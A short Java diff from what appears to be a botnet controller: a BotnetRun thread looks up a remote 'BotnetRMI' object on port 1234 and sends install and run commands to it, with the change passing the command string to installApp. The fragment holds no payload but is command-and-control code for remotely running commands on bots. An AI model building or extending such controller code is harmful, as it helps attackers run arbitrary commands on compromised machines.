@@ -30,7 +30,7 @@ public class BotnetRun extends Thread{
         try {
             IBotnet botnet = (IBotnet) Naming.lookup("rmi:/" + this.ip + ":" + "1234" + "/BotnetRMI");
             if (this.type.endsWith("install")){
-                botnet.installApp();
+                botnet.installApp(cmd);
             }
             if (this.type.endsWith("run")){
                 botnet.runCommand(cmd);
